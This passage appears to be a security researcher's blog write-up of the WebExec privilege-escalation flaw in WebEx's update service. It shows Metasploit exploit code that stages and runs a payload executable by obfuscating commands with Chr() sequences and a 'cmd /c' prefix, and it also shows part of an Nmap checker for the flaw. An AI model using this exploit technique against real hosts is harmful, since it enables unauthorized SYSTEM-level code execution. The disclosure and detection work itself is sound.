After some discussion with <a href="https://twitter.com/egyp7">Egyp7</a>, I realized I could use the <tt>Msf::Exploit::CmdStager</tt> mixin to stage the command to an .exe file to the filesystem. Using the .vbs flavor of staging, it would write a Base64-encoded file to the disk, then a .vbs stub to decode and execute it!

There are several problems, however:

<ul>
  <li>The max line length is ~1200 characters, whereas the <tt>CmdStager</tt> mixin uses ~2000 characters per line</li>
  <li><tt>CmdStager</tt> uses <tt>%TEMP%</tt> as a temporary directory, but our exploit doesn't expand paths</li>
  <li><tt>WebExecService</tt> seems to escape quotation marks with a backslash, and I'm not sure how to turn that off</li>
</ul>

The first two issues could be simply worked around by adding options (once I'd figured out the options to use):

<pre>wexec(<span class="Boolean">true</span>) <span class="Statement">do</span> |opts|
  opts[<span class="rubySymbol">:</span><span class="rubySymbol">flavor</span>] = <span class="rubySymbol">:</span><span class="rubySymbol">vbs</span>
  opts[<span class="rubySymbol">:</span><span class="rubySymbol">linemax</span>] = datastore[<span class="rubyStringDelimiter">"</span><span class="String">MAX_LINE_LENGTH</span><span class="rubyStringDelimiter">"</span>]
  opts[<span class="rubySymbol">:</span><span class="rubySymbol">temp</span>] = datastore[<span class="rubyStringDelimiter">"</span><span class="String">TMPDIR</span><span class="rubyStringDelimiter">"</span>]
  opts[<span class="rubySymbol">:</span><span class="rubySymbol">delay</span>] = <span class="Float">0.05</span>
  execute_cmdstager(opts)
<span class="Statement">end</span>
</pre>

<tt>execute_cmdstager()</tt> will execute <tt>execute_command()</tt> over and over to build the payload on-disk, which is where we fix the final issue:

<pre>
<span class="Comment"># This is the callback for cmdstager, which breaks the full command into</span>
<span class="Comment"># chunks and sends it our way. We have to do a bit of finangling to make it</span>
<span class="Comment"># work correctly</span>
<span class="Statement">def</span> <span class="Function">execute_command</span>(command, opts)
  <span class="Comment"># Replace the empty string, "", with a workaround - the first 0 characters of "A"</span>
  command = command.gsub(<span class="rubyStringDelimiter">'</span><span class="String">""</span><span class="rubyStringDelimiter">'</span>, <span class="rubyStringDelimiter">'</span><span class="String">mid(Chr(65), 1, 0)</span><span class="rubyStringDelimiter">'</span>)

  <span class="Comment"># Replace quoted strings with Chr(XX) versions, in a naive way</span>
  command = command.gsub(<span class="rubyStringDelimiter">/</span><span class="rubyRegexp">"</span><span class="Special">[^</span><span class="rubyRegexp">"</span><span class="Special">]</span><span class="Special">*</span><span class="rubyRegexp">"</span><span class="rubyStringDelimiter">/</span>) <span class="Statement">do</span> |capture|
    capture.gsub(<span class="rubyStringDelimiter">/</span><span class="rubyRegexp">"</span><span class="rubyStringDelimiter">/</span>, <span class="rubyStringDelimiter">""</span>).chars.map <span class="Statement">do</span> |c|
      <span class="rubyStringDelimiter">"</span><span class="String">Chr(</span><span class="rubyInterpolationDelimiter">#{</span>c.ord<span class="rubyInterpolationDelimiter">}</span><span class="String">)</span><span class="rubyStringDelimiter">"</span>
    <span class="Statement">end</span>.join(<span class="rubyStringDelimiter">'</span><span class="String">+</span><span class="rubyStringDelimiter">'</span>)
  <span class="Statement">end</span>

  <span class="Comment"># Prepend "cmd /c" so we can use a redirect</span>
  command = <span class="rubyStringDelimiter">"</span><span class="String">cmd /c </span><span class="rubyStringDelimiter">"</span> + command

  execute_single_command(command, opts)
<span class="Statement">end</span>
</pre>

First, it replaces the empty string with <tt>mid(Chr(65), 1, 0)</tt>, which works out to characters 1 - 1 of the string "A". Or the empty string!

Second, it replaces every other string with <tt>Chr(n)+Chr(n)+...</tt>. We couldn't use <tt>&amp;</tt>, because that's already used by the shell to chain commands. I later learned that we can escape it and use <tt>^&amp;</tt>, which works just fine, but <tt>+</tt> is shorter so I stuck with that.

And finally, we prepend <tt>cmd /c </tt> to the command, which lets us echo to a file instead of just passing the <tt>&gt;</tt> symbol to the process. We could probably use <tt>^&gt;</tt> instead.

In a targeted attack, it's obviously possible to do this much more cleanly, but this seems to be a great way to do it generically!

<h2>Checking for the patch</h2>

This is one of those rare (or maybe not so rare?) instances where exploiting the vulnerability is actually easier than checking for it!

The patched version of WebEx still allows remote users to connect to the process and start it. However, if the process detects that it's being asked to run an executable that is not signed by WebEx, the execution will halt. Unfortunately, that gives us no information about whether a host is vulnerable!

There are a lot of targeted ways we could validate whether code was run. We could use a DNS request, telnet back to a specific port, drop a file in the webroot, etc. The problem is that unless we have a generic way to check, it's no good as a script!

In order to exploit this, you have to be able to get a handle to the service-controlservice (svcctl), so to write a checker, I decided to install a fake service, try to start it, then delete the service. If starting the service returns either <code>OK</code> or <code>ACCESS_DENIED</code>, we know it worked!

Here's the important code from the <a href='https://github.com/iagox86/nmap-webexec/blob/master/scripts/smb-vuln-webexec.nse'>Nmap checker module we developed</a>:

<pre id='vimCodeElement'>
<span class="Comment">-- Create a test service that we can query</span>
<span class="Type">local</span> webexec_command <span class="Operator">=</span> <span class="String">&quot;sc create &quot;</span> <span class="Operator">..</span> test_service <span class="Operator">..</span> <span class="String">&quot; binpath= c:</span><span class="SpecialChar">\\</span><span class="String">fakepath.exe&quot;</span>
status, result <span class="Operator">=</span> msrpc.<span class="PreProc">svcctl_startservicew</span>(smbstate, open_service_result[<span class="String">'handle'</span>], stdnse.<span class="PreProc">strsplit</span>(<span class="String">&quot; &quot;</span>, <span class="String">&quot;install software-update 1 &quot;</span> <span class="Operator">..</span> webexec_command))

<span class="Comment">-- ...</span>

<span class="Type">local</span> test_status, test_result <span class="Operator">=</span> msrpc.<span class="PreProc">svcctl_openservicew</span>(smbstate, open_result[<span class="String">'handle'</span>], test_service, <span class="Number">0x00000</span>)

<span class="Comment">-- If the service DOES_NOT_EXIST, we couldn't run code</span>
<span class="Conditional">if</span> <span class="Special">string</span>.<span class="PreProc">match</span>(test_result, <span class="String">'DOES_NOT_EXIST'</span>) <span class="Conditional">then</span>
  stdnse.<span class="Special">debug</span>(<span class="String">&quot;Result: Test service does not exist: probably not vulnerable&quot;</span>)
  msrpc.<span class="PreProc">svcctl_closeservicehandle</span>(smbstate, open_result[<span class="String">'handle'</span>])

  vuln.check_results <span class="Operator">=</span> <span class="String">&quot;Could not execute code via WebExService&quot;</span>
  <span class="Statement">return</span> report:<span class="PreProc">make_output</span>(vuln)
<span class="Conditional">end</span>
</pre>

Not shown: we also delete the service once we're finished.

<h2>Conclusion</h2>

So there you have it! Escalating privileges from zero to SYSTEM using WebEx's built-in update service! Local and remote! Check out <a href='https://webexec.org'>webexec.org</a> for tools and usage instructions!